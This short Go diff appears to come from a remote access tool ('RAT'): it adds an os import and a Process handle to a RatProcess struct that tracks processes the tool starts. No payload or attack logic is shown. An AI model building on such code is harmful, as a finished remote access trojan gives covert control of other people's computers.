@@ -19,6 +19,7 @@ import (
 	"hash"
 	"io"
 	"net"
+	"os"
 
 	"github.com/cakturk/go-netstat/netstat"
 	"github.com/hashicorp/mdns"
@@ -38,8 +39,10 @@ type Command struct {
 	Failure_message string
 }
 
+// represents a process started by the RAT
 type RatProcess struct {
-	Pid int
+	Pid     int
+	Process *os.Process
 }
 
 // container for Commands
